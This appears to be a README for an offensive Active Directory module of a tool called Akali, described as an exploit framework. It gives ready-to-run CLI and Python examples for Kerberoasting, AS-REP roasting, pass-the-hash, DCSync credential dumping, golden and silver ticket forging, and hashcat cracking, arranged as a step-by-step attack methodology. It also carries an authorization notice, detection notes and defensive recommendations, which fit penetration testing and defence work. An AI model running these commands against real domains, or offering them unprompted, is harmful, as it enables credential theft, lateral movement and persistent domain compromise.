# Active Directory Attacks Module

Comprehensive Active Directory enumeration and post-exploitation toolkit for Akali Phase 9B.

## Overview

This module provides advanced Active Directory attack capabilities including:

- **Kerberos Attacks**: Kerberoasting, AS-REP roasting, ticket manipulation
- **NTLM Attacks**: Pass-the-Hash, Pass-the-Ticket, credential dumping
- **Ticket Generation**: Golden Tickets, Silver Tickets
- **Domain Enumeration**: Users, groups, computers, ACLs
- **BloodHound Integration**: Data collection and attack path analysis

## Architecture

```
extended/ad/
├── ad_attacker.py          # Main orchestration class
├── kerberos.py             # Kerberos-based attacks
├── ntlm.py                 # NTLM-based attacks
├── tickets.py              # Ticket generation
└── bloodhound_helper.py    # BloodHound integration
```

## Dependencies

### Required
- `ldap3` - LDAP enumeration
- `impacket` - Core AD attack tools
  - GetUserSPNs.py (Kerberoasting)
  - GetNPUsers.py (AS-REP roasting)
  - secretsdump.py (DCSync, SAM dumps)
  - psexec.py (Pass-the-Hash/Ticket)
  - ticketer.py (Ticket generation)

### Optional
- `bloodhound-python` - BloodHound data collection
- `hashcat` - Hash cracking
- `neo4j` - BloodHound database queries

## Installation

```bash
# Install Python dependencies
pip install ldap3 impacket bloodhound

# Install impacket tools (if not in PATH)
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .

# Install BloodHound (optional)
pip install bloodhound
```

## Usage

### CLI Commands

```bash
# Domain Enumeration
akali ad enum --domain corp.local --user admin --password pass123

# Kerberoasting
akali ad kerberoast --domain corp.local --user admin --password pass123

# AS-REP Roasting
akali ad asreproast --domain corp.local --user-list users.txt

# Pass-the-Hash
akali ad pth --username admin --hash aad3b...:8846f7... --target 10.0.0.5

# Golden Ticket
akali ad golden-ticket --domain corp.local --sid S-1-5-21-... --krbtgt-hash 8846f7...

# DCSync
akali ad dcsync --domain corp.local --user admin --password pass123 --target-user Administrator
```

### Python API

```python
from extended.ad import ADAttacker

# Initialize
attacker = ADAttacker()

# Enumerate domain
results = attacker.enumerate_domain(
    domain="corp.local",
    username="admin",
    password="password123"
)

# Kerberoast
hashes = attacker.kerberoast(
    domain="corp.local",
    username="admin",
    password="password123"
)

# Pass-the-Hash
attacker.pass_the_hash(
    username="admin",
    ntlm_hash="8846f7eaee8fb117ad06bdd830b7586c",
    target="10.0.0.5",
    command="whoami"
)

# Generate Golden Ticket
ticket = attacker.golden_ticket(
    domain="corp.local",
    sid="S-1-5-21-1234567890-1234567890-1234567890",
    krbtgt_hash="8846f7eaee8fb117ad06bdd830b7586c"
)
```

## Attack Methodology

### 1. Initial Enumeration

```bash
# Anonymous enumeration (if allowed)
akali ad enum --domain corp.local

# Authenticated enumeration
akali ad enum --domain corp.local --user lowpriv --password pass123
```

**Goal**: Identify users, groups, computers, and trust relationships.

### 2. Credential Harvesting

#### Kerberoasting
Extract service account credentials:

```bash
akali ad kerberoast --domain corp.local --user admin --password pass123
```

Then crack offline with hashcat:
```bash
hashcat -m 13100 -a 0 hashes.txt wordlist.txt
```

#### AS-REP Roasting
Find accounts without Kerberos pre-auth:

```bash
akali ad asreproast --domain corp.local --user-list users.txt
```

Crack with:
```bash
hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt
```

### 3. Lateral Movement

#### Pass-the-Hash
Use captured NTLM hashes:

```bash
akali ad pth --username admin --hash aad3b...:8846f7... --target 10.0.0.5 --command "ipconfig"
```

#### Pass-the-Ticket
Use captured/generated Kerberos tickets:

```bash
akali ad ptt --ticket admin.ccache --target 10.0.0.5
```

### 4. Privilege Escalation

#### DCSync
Dump all domain credentials (requires Domain Admin or equivalent):

```bash
akali ad dcsync --domain corp.local --user admin --password pass123
```

### 5. Persistence

#### Golden Ticket
Domain-level persistence via KRBTGT hash:

```bash
akali ad golden-ticket --domain corp.local --sid S-1-5-21-... --krbtgt-hash 8846f7...
```

#### Silver Ticket
Service-level persistence:

```bash
akali ad silver-ticket --domain corp.local --sid S-1-5-21-... \
    --service-hash 8846f7... --service CIFS/dc01.corp.local --username admin
```

### 6. Attack Path Analysis

Use BloodHound for privilege escalation paths:

```bash
# Collect data
akali ad bloodhound --domain corp.local --user admin --password pass123 --dc-ip 10.0.0.1

# Import ZIP to BloodHound GUI
# Analyze attack paths visually
```

## Hash Formats

### NTLM Hash
```
# Full format (LM:NTLM)
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# NTLM only
8846f7eaee8fb117ad06bdd830b7586c
```

### Kerberos TGS (Kerberoast)
```
$krb5tgs$23$*user$REALM$spn*$hash...
```

### Kerberos AS-REP
```
$krb5asrep$23$user@REALM:hash...
```

### SID Format
```
S-1-5-21-1234567890-1234567890-1234567890
S-1-5-21-1234567890-1234567890-1234567890-500  # With RID
```

## Security Considerations

### Authorization Required
**ALL operations require explicit authorization.** This module is designed for:

- Authorized penetration testing
- Red team exercises
- Security research in controlled environments
- Educational purposes with proper permissions

### Mock Mode
For testing without AD environment:

```python
# Tests use mocked impacket/ldap3 operations
pytest tests/extended/ad/
```

### Detection Awareness

These attacks generate logs and alerts in monitored environments:

- **Kerberoasting**: TGS-REQ for SPN accounts
- **AS-REP Roasting**: AS-REQ without pre-auth
- **DCSync**: Replication requests from non-DC
- **Golden Ticket**: Unusual TGT parameters
- **Pass-the-Hash**: NTLM auth from unusual sources

Use responsibly and only in authorized contexts.

## Defensive Recommendations

To defend against these attacks:

1. **Kerberoasting**:
   - Use strong passwords for service accounts (25+ chars)
   - Implement Group Managed Service Accounts (gMSA)
   - Monitor for TGS-REQ spikes

2. **AS-REP Roasting**:
   - Enable Kerberos pre-authentication for all accounts
   - Audit accounts with DONT_REQ_PREAUTH flag

3. **Pass-the-Hash**:
   - Enable NTLM authentication restrictions
   - Implement Credential Guard
   - Use Protected Users group

4. **DCSync**:
   - Restrict replication permissions
   - Monitor for non-DC replication requests
   - Implement tiered admin model

5. **Golden/Silver Tickets**:
   - Rotate KRBTGT password regularly (twice)
   - Monitor for anomalous ticket lifetimes
   - Use Azure ATP or similar detection

## Troubleshooting

### "Tool not found" errors
Ensure impacket scripts are in PATH:
```bash
export PATH=$PATH:~/.local/bin
# Or use full paths to scripts
```

### LDAP connection failures
```bash
# Check DC connectivity
nmap -p 389,636,3268,3269 dc01.corp.local

# Test LDAP bind
ldapsearch -H ldap://dc01.corp.local -D "admin@corp.local" -W
```

### Kerberos errors
```bash
# Check KDC connectivity
nmap -p 88 dc01.corp.local

# Verify domain time sync
ntpdate -q dc01.corp.local
```

## References

- [Kerberoasting Attack](https://attack.mitre.org/techniques/T1558/003/)
- [AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)
- [Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
- [DCSync](https://attack.mitre.org/techniques/T1003/006/)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Impacket Tools](https://github.com/fortra/impacket)

## Testing

Run the test suite:

```bash
# All AD tests
pytest tests/extended/ad/ -v

# Specific module
pytest tests/extended/ad/test_kerberos.py -v

# With coverage
pytest tests/extended/ad/ --cov=extended/ad --cov-report=html
```

## Author

Akali - The Security Sentinel

Part of Akali Phase 9B: Exploit Framework
